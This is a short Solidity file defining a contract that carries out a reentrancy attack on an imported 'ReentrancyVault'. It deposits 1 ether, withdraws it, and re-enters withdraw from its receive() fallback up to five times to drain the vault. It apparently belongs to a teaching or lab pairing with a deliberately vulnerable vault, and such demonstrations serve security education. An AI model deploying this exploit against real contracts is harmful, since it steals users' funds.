// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ReentrancyVault.sol";

contract ReentrancyAttacker {

    ReentrancyVault public vault;
    uint256 public attackCount;

    constructor(ReentrancyVault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        require(msg.value >= 1 ether);

        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 5) {
            attackCount++;
            vault.withdraw(1 ether);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
